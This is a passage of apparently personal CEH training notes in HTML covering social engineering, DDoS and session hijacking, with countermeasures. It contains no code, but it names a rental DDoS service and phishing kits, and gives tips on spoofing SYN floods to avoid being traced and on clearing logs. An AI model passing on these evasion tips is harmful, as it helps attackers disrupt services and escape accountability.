Social Engineering</summary><p id="a9b92618-ed1c-46d9-81f9-ed00dc186d6f" class="">The art of convincing people to reveal confidential information</p><p id="a70deae1-46f8-4e4f-8241-d3170e77bba1" class="">
</p><h3 id="7ffcaa1e-afd1-4746-9d94-67b24309a220" class="">Summarize Social Engineering Concepts</h3><ul id="81635a85-c498-4869-9885-59e5ee429156" class="toggle"><li><details open=""><summary>Phases of Social Engineering</summary><figure id="3fe5db48-9384-4949-8258-0c79753d15ff" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2031.png"><img style="width:534px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2031.png"/></a></figure></details></li></ul><p id="77a548cb-2b73-48bf-933d-fb4577325749" class="">
</p><h3 id="e7e07fd6-17d2-4096-b7e4-2c7393a25829" class="">Explain Various Social Engineering Techniques</h3><figure id="b1c0079a-bcd6-4c21-932e-6e84a7e28c66" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2032.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2032.png"/></a></figure><h3 id="99380e9c-be63-4b38-a9b3-ace6b98fd273" class="">Human Based</h3><ul id="607eef0f-332b-4c73-aa5c-d67248f0b900" class="bulleted-list"><li style="list-style-type:disc">impersonate over phone</li></ul><ul id="cf1f79c4-c02f-4219-a58e-91fbbc44a97a" class="bulleted-list"><li style="list-style-type:disc">impersonate someone important</li></ul><ul id="94ecdc65-e2bf-4c8e-8803-3ca82f691aaf" class="bulleted-list"><li style="list-style-type:disc">Evesdropping</li></ul><ul id="72425216-c03f-4cd6-ae2d-a91b89de42db" class="bulleted-list"><li style="list-style-type:disc">Shoulder Surfing</li></ul><ul id="6aeb7a37-ff98-4ad1-a018-4047c29f85b9" class="bulleted-list"><li style="list-style-type:disc">Dumster Diving</li></ul><ul id="2773fe46-aeaa-4dbe-9883-01d8e02a9cc8" class="bulleted-list"><li style="list-style-type:disc">Reverse Social Engineering:</li></ul><ul id="26fa2cb9-6f0e-4152-91e8-d7568e14d4c3" class="bulleted-list"><li style="list-style-type:disc">Piggybackig</li></ul><ul id="4b37967f-757b-465d-8c1c-decbfd6ae555" class="bulleted-list"><li style="list-style-type:disc">Tailgating</li></ul><ul id="bf56fbf8-af8a-41b1-bc68-4961439c1027" class="bulleted-list"><li style="list-style-type:disc">Diversion Theft</li></ul><h3 id="fa999c5c-82ff-414a-af15-2ad29d4f6a28" class="">Computer Based</h3><ul id="6c45619c-ca18-4f50-aed1-51a9e2639c4e" class="bulleted-list"><li style="list-style-type:disc">pop up windows</li></ul><ul id="4ef325d2-e65e-4a1b-905a-63211e5de9a3" class="bulleted-list"><li style="list-style-type:disc">hoax letters</li></ul><ul id="b76c2f7a-7cfb-42f2-a0d8-5c9c17694bb5" class="bulleted-list"><li style="list-style-type:disc">chain letters</li></ul><ul id="f39c2097-d3d5-44ba-91ad-12dd9814db37" class="bulleted-list"><li style="list-style-type:disc">instant chat messenger</li></ul><ul id="d8a7135b-aa30-448f-9073-0cbf1e067f6b" class="bulleted-list"><li style="list-style-type:disc">spame email</li></ul><ul id="d4c9b97b-a220-45a6-a1b2-6b806b444b2e" class="bulleted-list"><li style="list-style-type:disc">scareware</li></ul><ul id="23df8db7-70cf-4965-b99b-245ad5608b6b" class="bulleted-list"><li style="list-style-type:disc">spear phisning </li></ul><ul id="8dc67ada-55cb-44b3-ae99-1222f8f59dd7" class="bulleted-list"><li style="list-style-type:disc">whaling - target high profile people</li></ul><ul id="ff49f617-c816-40bd-9c74-7813e857c41d" class="bulleted-list"><li style="list-style-type:disc">pharming</li></ul><ul id="7f9ee5c0-affa-43f2-80f4-978fb3bec003" class="bulleted-list"><li style="list-style-type:disc">spimming</li></ul><ul id="2b920cc6-8ed7-45ec-9ab7-178f3218b4c6" class="bulleted-list"><li style="list-style-type:disc">Phishing:<ul id="fc4268fd-73ff-4e13-aff3-b809e9f08c35" class="bulleted-list"><li style="list-style-type:circle">angler - fake soscial media account impresonating organisation</li></ul><ul id="45b1ccfe-dcff-4641-8e22-9fe6ce8726ea" class="bulleted-list"><li style="list-style-type:circle">catfishing - identity theft of a target person</li></ul><ul id="e19989b3-85d4-4fb2-86c7-1c8960cd68d7" class="bulleted-list"><li style="list-style-type:circle">deepfake </li></ul><ul id="8dc8cc20-b1ae-4ce8-b8a5-f060c94a1207" class="bulleted-list"><li style="list-style-type:circle">Tools: blackeye, phishx, modlishka, trape, evilginx</li></ul></li></ul><ul id="64809a51-49da-4424-b4c3-5040fb176998" class="bulleted-list"><li style="list-style-type:disc">Mobile Based:<ul id="97e2990a-f8ed-4f19-90a3-ff9eb24cc986" class="bulleted-list"><li style="list-style-type:circle">publishing malicious apps</li></ul><ul id="a9a5d522-7ffa-4f94-8789-8c1e65f5d9a4" class="bulleted-list"><li style="list-style-type:circle">repackaging legitimate apps<ul id="c95aada3-348a-430f-8e57-a2f6af6a7115" class="bulleted-list"><li style="list-style-type:square">apk is just a zip file that has all the source code inside</li></ul><ul id="9a07d6d9-5c42-4f09-a725-8d66497e3521" class="bulleted-list"><li style="list-style-type:square">so replace a file with your own in the zip</li></ul></li></ul></li></ul><ul id="701286bb-52cf-420d-ba65-7d293318dbec" class="bulleted-list"><li style="list-style-type:disc">Fake Security Application</li></ul><ul id="a93c7db1-67a3-415b-aafa-68489a96b00f" class="bulleted-list"><li style="list-style-type:disc">SMiShing (SMS Phishing)<ul id="67b1fdd8-db54-4406-8634-b1c19f115755" class="bulleted-list"><li style="list-style-type:circle">can buy 1000 sms for 100 euros worldwide</li></ul></li></ul><ul id="7592ff60-980c-4e38-af5e-ba62990baa52" class="bulleted-list"><li style="list-style-type:disc">Defend:<ul id="1993651b-3be9-46b0-85c1-c04a8626500a" class="bulleted-list"><li style="list-style-type:circle">mxtoolbox to check if an email or domain is blacklisted</li></ul></li></ul><p id="daef2acc-278a-4ee6-8877-dc5e34982dd1" class="">
</p><h3 id="21e13fe1-86a8-46c6-8278-730b5f2384de" class="">Insider Threats</h3><ul id="98f9e3ab-a771-4dd3-86c3-83dc0d282b47" class="toggle"><li><details open=""><summary>Types of Insider Threats</summary><figure id="2b1a25e5-d4ba-4150-bf2f-b05883d0546d" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2033.png"><img style="width:574px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2033.png"/></a></figure></details></li></ul><ul id="966c3972-7da3-4e14-a379-6baa0757e266" class="toggle"><li><details open=""><summary>Behavioral Indicators of an Insider Threat</summary><figure id="23874508-8618-48f8-915f-da2dddd8261d" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2034.png"><img style="width:577px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2034.png"/></a></figure></details></li></ul><h3 id="3b528e9f-fa25-41ef-88cd-4bbd20919320" class="">Impersonation on Social Networking Sites</h3><ul id="f74940f1-471e-441b-b443-4c1f9e744187" class="bulleted-list"><li style="list-style-type:disc">people use registered sex offenders to create fake profiles</li></ul><ul id="31995628-89bd-4331-aa45-ca5aa6c0519d" class="bulleted-list"><li style="list-style-type:disc">impersonate someone else</li></ul><p id="741872c1-b952-4d7b-a47f-29831886b83d" class="">
</p><h3 id="51a57085-1d2e-4a79-a7aa-d3b9bbc4582d" class="">Explain Identity Theft</h3><p id="615a5513-9e36-479e-afe9-5056fa9ec77e" class="">
</p><h3 id="d46ea7ca-28cd-482a-8e33-751315e8d3ee" class="">Explain Social Engineering Countermeasures</h3><figure id="ac397194-53c6-425d-84e8-78d566561a52" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2035.png"><img style="width:576px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2035.png"/></a></figure><figure id="ceee3fb3-f942-4cf1-8c6d-562fb77d5a38" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2036.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2036.png"/></a></figure><ul id="37b27afe-b58a-4840-a56b-116176d31624" class="bulleted-list"><li style="list-style-type:disc">Anti-Phishing Toolbar</li></ul><ul id="3a5b190a-e377-4ee4-93b2-4654e526c8f6" class="toggle"><li><details open=""><summary>Social Engineering Techniques and Defense Strategies</summary><figure id="6670a8c2-5b96-4edc-b5eb-523359f4fd7d" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2037.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2037.png"/></a></figure></details></li></ul><p id="cd233bab-a391-4768-a021-130d13a1edf2" class="">
</p></details></li></ul><ul id="ed05fc36-576e-4cb9-ae42-d3a0a87263d0" class="toggle"><li><details open=""><summary>Module 10 - Denial-of-Service</summary><h3 id="c932cb61-2ffb-4853-a39a-4e852649dd85" class="">Summarize DoS/DDoS Concepts</h3><p id="1490e4f2-255f-496c-8548-e651dd940fc5" class="">
</p><h3 id="553ee2b8-1fc1-4ed2-9983-d04dbb4ae3e9" class="">Explain Botnet Network</h3><p id="0047109f-4dba-4ae1-a33e-79d406b19750" class="">
</p><h3 id="52a11e92-2a63-4502-844b-034e806c3a90" class="">Demonstrate Different DoS/DDoS Attack Techniques</h3><figure id="f1990cd1-2f44-4852-9ee2-12f475221c73" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2038.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2038.png"/></a></figure><ul id="691de2e8-35c8-41fa-9953-d60b8a5429db" class="bulleted-list"><li style="list-style-type:disc">SYN Flood attack<ul id="0394e324-743a-4182-8940-871a12c69e51" class="bulleted-list"><li style="list-style-type:circle">75 seconds in exam</li></ul><ul id="bf6958ed-385d-4a0a-833f-846f72ba4249" class="bulleted-list"><li style="list-style-type:circle">if you spoof this attack using metasploit, they cant identify you UNLESS the ISP searches for logs</li></ul><ul id="70758512-7fcd-41c8-a0f6-d8c76cdea494" class="bulleted-list"><li style="list-style-type:circle">if you wait half an hour and continue etc they might never find you because it will work for half an hour and then not etc</li></ul><ul id="31190480-5023-4c86-ae09-43d2a519c384" class="bulleted-list"><li style="list-style-type:circle">local lans might be vulnerable to this because you need a modern router that detects it</li></ul></li></ul><ul id="4f459972-23ea-48ad-b8e9-eeeaad9e5fcd" class="bulleted-list"><li style="list-style-type:disc">fragmentation attack</li></ul><ul id="13eb5826-2a29-4f45-8f83-df4f72aa2a6d" class="bulleted-list"><li style="list-style-type:disc">UDP Application Layer Flood Attack</li></ul><ul id="96a913dc-34b2-416c-95ed-512d8f73239a" class="bulleted-list"><li style="list-style-type:disc">Multi Vector Attacks<ul id="f0c83217-187d-47af-80fc-0a9b73c8eeea" class="bulleted-list"><li style="list-style-type:circle">more realistic in real life</li></ul><ul id="243383dc-1a67-4b80-80c8-ac0ca5ace58e" class="bulleted-list"><li style="list-style-type:circle">combination of volumetric, protocol, and application layer attacks</li></ul></li></ul><ul id="7beec212-8cb4-4922-a522-cfabec2bfeb1" class="bulleted-list"><li style="list-style-type:disc">Peer-to-Peer Attack<ul id="4026b6d7-4f23-4c36-a9e9-3f8602295b7d" class="bulleted-list"><li style="list-style-type:circle">instruct clients to attack other clients</li></ul></li></ul><ul id="5fbdc37c-3066-4547-92cb-62a943c6d9f4" class="bulleted-list"><li style="list-style-type:disc">Permanent Denial of Service Attack</li></ul><ul id="3b6c01a1-b0f9-4bf8-9c34-dd26c00cd14a" class="bulleted-list"><li style="list-style-type:disc">TCP SACK Panic Attack</li></ul><ul id="1d10b7cd-1b23-4863-8862-a90401fdd7d6" class="bulleted-list"><li style="list-style-type:disc">Distributed Reflection DOS Attack<ul id="03934695-3421-4e63-b856-e40e9b229a1a" class="bulleted-list"><li style="list-style-type:circle">use a victim that uses a victim to attack a target</li></ul><ul id="20a9d9fe-2ea7-443c-86d7-d60610ac4e9a" class="bulleted-list"><li style="list-style-type:circle">an example is the use of dns queries</li></ul></li></ul><ul id="69405c78-f1c4-4ef4-89fa-8510408018ef" class="bulleted-list"><li style="list-style-type:disc">HTTP GET/POST Attacks</li></ul><ul id="bf059836-7b30-4c12-b6e6-215ede8dfbc3" class="bulleted-list"><li style="list-style-type:disc">Slowris Attacks <ul id="89d6d5f0-aebd-49d6-af71-6a8c2a6c6765" class="bulleted-list"><li style="list-style-type:circle">very powerful even from your own pc</li></ul><ul id="a05f66ff-146a-4e73-ad4e-030098ba71d0" class="bulleted-list"><li style="list-style-type:circle">only routers that examine application level attacks prevent this</li></ul></li></ul><ul id="80f96078-e0fc-43aa-a3f5-ce0ec0fc90b1" class="bulleted-list"><li style="list-style-type:disc">Rent your own ddos: maxstresser.com</li></ul><ul id="898ffb4f-2c5b-401d-8c08-d4d85723babb" class="bulleted-list"><li style="list-style-type:disc">DDOS Tools<ul id="eb396f65-aaf7-4eec-b8a3-86ebd7429351" class="bulleted-list"><li style="list-style-type:circle">in exam</li></ul><ul id="503a6605-0a5b-4bce-8b6b-e592ffc17441" class="bulleted-list"><li style="list-style-type:circle">High Orbit Ion Cannon</li></ul><ul id="6433c1d2-ca81-482c-b10b-3df99895dbc7" class="bulleted-list"><li style="list-style-type:circle">Low Orbit Ion Cannon - can have a message inside</li></ul><ul id="fe988b9c-6127-412b-861b-9ee9aa8ed8a8" class="bulleted-list"><li style="list-style-type:circle">XOIC, HULC, Metasploit, Tor’s Hammer, Slowloris, PyLoris</li></ul></li></ul><h3 id="5d1c42a0-e46b-4af4-a3dc-ba903a992815" class="">Present DDoS Case Study</h3><ul id="5c246626-f128-41fd-8aca-37be5824114a" class="bulleted-list"><li style="list-style-type:disc">mastercard was attacked</li></ul><ul id="83eafac3-c4ed-49c3-bdbc-e9d113006839" class="bulleted-list"><li style="list-style-type:disc">use of mobile devices</li></ul><ul id="e1ceca54-abdf-4690-a10e-bf5e43bbd4da" class="bulleted-list"><li style="list-style-type:disc">ddos attack on azure</li></ul><p id="5b28b80d-3475-4135-8d54-4864d6c4f438" class="">
</p><h3 id="8a5a208b-69d3-4b27-94fd-a07b8413110d" class="">Explain DoS/DDoS Attack Countermeasures</h3><figure id="35dc5cc2-0b97-4d30-a898-f8eaf743443c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2039.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2039.png"/></a></figure><figure id="00d8d3b8-02b6-45b2-ae65-6a260d429387" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2040.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2040.png"/></a></figure><figure id="fc45b11f-8f18-4b07-9867-eb69c7efecc0" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2041.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2041.png"/></a></figure><ul id="051178a8-a6a5-4a3b-a4db-02cf7e9c98a7" class="bulleted-list"><li style="list-style-type:disc">Use KFSensor that simulates vulnerable servers, can be used as a honeypot</li></ul></details></li></ul><ul id="e424fb8b-814d-4384-ace3-eb8758000849" class="toggle"><li><details open=""><summary>Module 11 - Session Hijacking</summary><p id="76fc88ee-6d36-4998-9aa5-0d9abbe673c4" class="">Hijack either a tcp session or an application session</p><h3 id="23713b16-ab7a-4c31-9446-56d701ba58a4" class="">Summarize Session Hijacking Concepts</h3><ul id="5d3a7e58-74d3-4ed8-91a2-a4856a565317" class="bulleted-list"><li style="list-style-type:disc">passive and active</li></ul><ul id="b7aaa4af-19cc-4093-a207-2b5c283271b6" class="bulleted-list"><li style="list-style-type:disc">network level and application level</li></ul><ul id="f1431bca-7018-4dfc-9481-1fa8ed89daaa" class="bulleted-list"><li style="list-style-type:disc">Spoofing: pretending to be someone else</li></ul><ul id="6d9a8d46-a987-468c-88e5-84972b4b2aa2" class="bulleted-list"><li style="list-style-type:disc">Hijack: get the session, steal it</li></ul><h3 id="7dbba98a-ea59-446d-b63b-04723fb91968" class="">Explain Application Level Session Hijacking</h3><p id="6cba21d8-8db6-4bfd-bea7-fcca3f669154" class="">gain the session </p><p id="bf65eb15-f4d3-4503-a586-b1bc0d8745b5" class="">mitm attacks with cain and able </p><p id="fbf7a2ff-33c0-46fa-baea-b8f98db794a6" class="">or attacks with fake ssl certificates</p><p id="5243efd2-5a94-47bd-9033-83efd81992e8" class="">or unencrypted traffic on other ports</p><p id="8343b882-fe3a-4277-9821-5f893b113d88" class="">
</p><ul id="e437188e-c419-49b0-9dad-2b5e5a1b8e64" class="toggle"><li><details open=""><summary>Ways to steal the session</summary><figure id="3bbe37fd-42df-4bec-ba62-e63730d6aa2b" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2042.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2042.png"/></a></figure></details></li></ul><ul id="f9ff064c-f92d-48e4-9495-a480738f60f8" class="bulleted-list"><li style="list-style-type:disc">Compromise Session IDs by sniffing</li></ul><ul id="57c0ac07-455e-4218-8b5c-541eac714af9" class="bulleted-list"><li style="list-style-type:disc">Predict Session Token<ul id="5d3bad0b-c059-4475-ae31-29e2069fbfd3" class="bulleted-list"><li style="list-style-type:circle">predictable tokens that append Constant + Date + Time</li></ul></li></ul><ul id="661f03c5-39d6-47e1-9869-92b7923d46e5" class="bulleted-list"><li style="list-style-type:disc">Man in the Middle Attacks<ul id="8fc8d6a9-6aaa-4c09-a8f9-30ca50b2c6eb" class="bulleted-list"><li style="list-style-type:circle">using arp poisoning</li></ul><ul id="b3785cf6-62b2-4b76-b990-3aaf229a654b" class="bulleted-list"><li style="list-style-type:circle">cain and able is a great tool for this and it still works</li></ul><ul id="fa66ee59-e0d9-4c57-9476-0d3bc6ee0cd7" class="bulleted-list"><li style="list-style-type:circle">sslstripping<ul id="45ca674d-ec92-43c5-aed5-bf7436ccde30" class="bulleted-list"><li style="list-style-type:square">drops the s in https when the connection starts</li></ul><ul id="689d3cd0-5d58-4807-b7bf-ecc44f122540" class="bulleted-list"><li style="list-style-type:square">the attacker is the one that has the certificate when starting </li></ul><ul id="9b1e706d-04ec-4e43-82ce-9570fc16a9ae" class="bulleted-list"><li style="list-style-type:square">the web server thinks its stil https because it communicatesonly with the attacker</li></ul><ul id="5819a377-a33e-4dfa-8f9d-c9a3da3b88f9" class="bulleted-list"><li style="list-style-type:square">is secured with HSTS in web servers not allowing downgrades from https to http</li></ul></li></ul><ul id="533e00b0-2d3e-44fe-b878-a3da20e78be4" class="bulleted-list"><li style="list-style-type:circle">mitm fake certificate</li></ul></li></ul><ul id="74b75839-9f4b-4eb1-80cc-4f49d8fb1f12" class="bulleted-list"><li style="list-style-type:disc">Man in the Browser<ul id="49b135d6-a420-4d86-8f98-6f7720a7500f" class="bulleted-list"><li style="list-style-type:circle">browser doesnt allow cross domain access, two tabs cannot access each other’s cookies</li></ul><ul id="225a93d4-4b63-4a49-b193-0eea481824ed" class="bulleted-list"><li style="list-style-type:circle">there are ways to bypass that</li></ul><ul id="6fee87f3-0555-4e28-9f7c-fd3c1d35aae8" class="bulleted-list"><li style="list-style-type:circle">by implementing an addon </li></ul></li></ul><ul id="733cf8e1-4b65-4ee3-b5c3-68fa4015987e" class="bulleted-list"><li style="list-style-type:disc">Session ID Client-side Attacks<ul id="1c9c3c5c-f206-4044-9201-96c84200987f" class="bulleted-list"><li style="list-style-type:circle">XSS</li></ul><ul id="1fc0bb96-ea38-402e-8525-68f86eee7299" class="bulleted-list"><li style="list-style-type:circle">CSRF</li></ul><ul id="8a178f96-c79e-4589-9894-68b8a83d909a" class="bulleted-list"><li style="list-style-type:circle">Session Fixation</li></ul><ul id="cdeec065-55da-40fa-89a7-f9a304eacde9" class="bulleted-list"><li style="list-style-type:circle">malicious js codes</li></ul><ul id="fd8881cc-a055-4677-bf4c-5f3442198739" class="bulleted-list"><li style="list-style-type:circle">trojans with changing proxy settings</li></ul></li></ul><ul id="646cc727-16d8-4e29-997e-cb8d1aad79b1" class="bulleted-list"><li style="list-style-type:disc">Hijacking using proxy servers</li></ul><ul id="7dcaf93e-6589-4a32-8564-66c1db4658ed" class="bulleted-list"><li style="list-style-type:disc">CRIME Attack<ul id="705cf961-ea89-4364-82be-65f32a67eb6d" class="bulleted-list"><li style="list-style-type:circle">almost impossible to be conducted</li></ul><ul id="0f5fdd71-1ba1-412c-b05d-a6e3ccf0821c" class="bulleted-list"><li style="list-style-type:circle">exploits data compression feature inside ssl</li></ul><ul id="fbfa0607-c04f-4c95-b3d8-c63c70fcf06b" class="bulleted-list"><li style="list-style-type:circle">it can decrypt the content like this</li></ul></li></ul><ul id="865ddfaa-e141-418d-ae3c-347b847cb96d" class="bulleted-list"><li style="list-style-type:disc">Forbidden Attack</li></ul><ul id="f49e2c16-5676-4b47-8fdd-918ec6f88dd7" class="bulleted-list"><li style="list-style-type:disc">Session Donation Attack<ul id="cb58224f-2804-47fa-8976-500a62545c0c" class="bulleted-list"><li style="list-style-type:circle">attacker creates a session Id</li></ul><ul id="918849b0-37d1-42f4-95b1-f1c1b70b8f60" class="bulleted-list"><li style="list-style-type:circle">and because we dont know the transaction url of higher privileged users</li></ul><ul id="828ad97a-e99d-4599-8d40-2f69d59fae9c" class="bulleted-list"><li style="list-style-type:circle">so it gives that session id to the victim so that he clicks on a link that the hacker cant</li></ul></li></ul><ul id="cdf0c98a-be86-4585-b41c-10dfcb96ff5f" class="bulleted-list"><li style="list-style-type:disc">PetitPotam<ul id="ae628104-f8f7-4915-bf20-6f94241458e3" class="bulleted-list"><li style="list-style-type:circle">Microsoft Encrypting File System Protocol hijack</li></ul><ul id="2f0a355e-290e-427e-85f8-f240d4fdcb74" class="bulleted-list"><li style="list-style-type:circle">no publicly available exploits</li></ul></li></ul><p id="7a5da3f9-1c55-4441-a332-34a94f2a169e" class="">
</p><h3 id="74363666-352b-4521-8cdb-8072b6fd7f2b" class="">Explain Network Level Session Hijacking</h3><p id="054260fe-1d09-4d7d-9120-1dad074339aa" class="">
</p><p id="edcd6ed2-dd87-4cf1-8d96-c0bcdd3ed1d7" class="">
</p><p id="31c7fc1a-37ef-47f9-b73a-407b09769e88" class="">
</p><h3 id="46cc7c57-840c-436c-8b32-d6a5f7e1acd7" class="">Use Session Hijacking Tools</h3><p id="b7597bcf-0439-4ff2-ba18-5f869ab4433c" class="">
</p><p id="fbaf4ddf-620f-4591-bfb5-fb24bf4d3832" class="">
</p><h3 id="f9e9e7cf-0df7-4022-8a32-c99fcceb3e15" class="">Explain Session Hijacking Countermeasures</h3><ul id="697e53c5-dc91-4511-b88f-f848b18b5d86" class="bulleted-list"><li style="list-style-type:disc">never use telnet<ul id="27a8a05f-ed9d-4cda-8a7d-b490d354e4d4" class="bulleted-list"><li style="list-style-type:circle">use HSTS preloaded addresses</li></ul></li></ul><figure id="dcb9fff3-99f1-40d6-ba8b-989eea0bd08f" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2043.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2043.png"/></a></figure><p id="0a226e41-1dc8-4ae3-b4a4-62c90df24d6a" class="">IPSec<div class="indented"><ul id="67cc1f58-421a-4185-b6bc-c5c3f27e06a7" class="bulleted-list"><li style="list-style-type:disc">components of ipsec in the exam</li></ul><ul id="dacb0fc4-e008-4ef2-b1c9-54269761a993" class="bulleted-list"><li style="list-style-type:disc">Modes: Transport mode, tunnel mode<ul id="4155be17-7ba3-458b-8c92-7d61456a6d63" class="bulleted-list"><li style="list-style-type:circle">tunnel is better security</li></ul></li></ul><ul id="f1c082a9-ccd0-45b7-b0ef-22bd66133a47" class="bulleted-list"><li style="list-style-type:disc">can be configured in the local group policy<ul id="6baff5f7-fbb0-4e30-a3f6-205b80dfc002" class="bulleted-list"><li style="list-style-type:circle">but it can be set as optional aswell</li></ul></li></ul></div></p><p id="198698b6-a199-4d82-b654-63ab708cf814" class="">Tools:<div class="indented"><ul id="08e70a1a-54d6-428b-a636-f8873685859f" class="bulleted-list"><li style="list-style-type:disc">Fiddler<ul id="6fccb9d9-fba2-4b1b-a29a-c6c932c26a5f" class="bulleted-list"><li style="list-style-type:circle">you can attach to a process of a web application or any communication</li></ul><ul id="204abe63-dde5-475b-b9ff-2b31a0251106" class="bulleted-list"><li style="list-style-type:circle">is trial but can use a snapshot and revert when trial ends</li></ul></li></ul><ul id="88d88ce7-4350-467f-8da4-d32f7d2bc7ef" class="bulleted-list"><li style="list-style-type:disc">CxSAST</li></ul></div></p></details></li></ul><p id="4f0a2dbe-16c8-404c-83e6-c8708b169ae7" class="">
</p></div></details><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Day 5 - Firewall and Web</summary><div class="indented"><ul id="31b808dd-4250-441f-a08c-25abbfb18496" class="toggle"><li><details open=""><summary>Recording</summary><figure id="39b4659f-d15d-497b-85f2-518bb23d7c17"><div class="source"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/CEH_Day_5_-_Modules_11_12_13_14_15.txt">CEH Day 5 - Modules 11, 12, 13, 14, 15.txt</a></div></figure></details></li></ul><ul id="bd2118ed-9d3e-4cf8-8e5d-76a687060b1e" class="toggle"><li><details open=""><summary>Module 12 - Evading Ids Firewalls and Honeypots</summary><p id="2140322e-ea7a-4c10-b7e5-b7cb97d43ce1" class="">
</p><h3 id="7c98249a-2b23-4ea0-96c6-1be21cc6866c" class="">Summarize and IDS, IPS, Firewall and Honeypot Concepts</h3><ul id="998c2eb7-79d6-4f18-a5c2-ef8a814e6408" class="bulleted-list"><li style="list-style-type:disc">morphisec is an example that can protect very well</li></ul><ul id="716a240b-e337-4dcf-a2a1-598a1ddd1827" class="bulleted-list"><li style="list-style-type:disc">IDS<ul id="0638b533-2f0c-4fea-b226-f9b94654d969" class="bulleted-list"><li style="list-style-type:circle">signature, anomaly, protocol anomaly</li></ul></li></ul><ul id="eb2c8f29-7df5-43c1-bf39-129c2ccc75d6" class="bulleted-list"><li style="list-style-type:disc">Intrusion Indications:<ul id="a78bfd62-58b6-43c6-b322-e9d948fbc6cc" class="bulleted-list"><li style="list-style-type:circle">file system intrusions, network intrusions, system intrusions</li></ul><ul id="327c3550-25f1-4d47-9919-63b0533ee661" class="bulleted-list"><li style="list-style-type:circle">a good indicator is a sudden loss of log data <ul id="b5fbc647-3cc8-4c18-b78b-0683a1b4e07b" class="bulleted-list"><li style="list-style-type:square">eg. usually we produce 10k but today 2k</li></ul><ul id="ed22b384-5ed4-4f35-baac-16bbb56eaa32" class="bulleted-list"><li style="list-style-type:square">eg. high peak in outgoing traffic than usual</li></ul><ul id="e23592f8-91ac-4ae6-bb39-c03e8ba8cb63" class="bulleted-list"><li style="list-style-type:square">in windows ther is a log that logs are cleared but in windows its text, remove it and remove bash history</li></ul></li></ul></li></ul><ul id="644e6f63-d1a3-4d96-a788-846fa5fb7b23" class="bulleted-list"><li style="list-style-type:disc">Types of IDS:<ul id="fa766aac-35da-431c-8f58-52b663bb5898" class="bulleted-list"><li style="list-style-type:circle">network or host based</li></ul><ul id="791476cb-6c5c-4d70-a3ed-a2426d2bb846" class="bulleted-list"><li style="list-style-type:circle">type of alerts: true positive, false positive, false negative, true negative</li></ul></li></ul><ul id="218699f7-19bb-4e1d-8e87-b73958a9a7ee" class="bulleted-list"><li style="list-style-type:disc">IPS: prevents not only detects</li></ul><ul id="d4676100-0cd9-452e-8fe2-0b21436208ea" class="bulleted-list"><li style="list-style-type:disc">Firewall: prevents unauthorized access on a netrwork or on a computer<ul id="080ac586-e6e3-4d7e-b83b-6b2d829c7272" class="toggle"><li><details open=""><summary>Firewall architecture</summary><figure id="0de0590b-cb78-4820-be79-9a05a3856280" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2044.png"><img style="width:779.6732788085938px" 